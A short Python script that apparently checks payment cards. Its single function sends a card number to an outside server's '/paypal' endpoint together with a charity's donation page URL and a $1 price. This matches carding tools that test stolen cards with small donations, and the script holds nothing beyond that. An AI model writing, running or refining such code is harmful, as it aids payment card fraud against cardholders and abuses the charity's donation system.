import requests
def chkk(ccx):
	cc=ccx.strip()
	urll="https://ballardhouseproject.org/donations/ballard_house_project/"
	price="1"
	res=requests.get(f'http://pqy2-production.up.railway.app/paypal?cc={cc}&url={urll}&price={price}').text
	return res
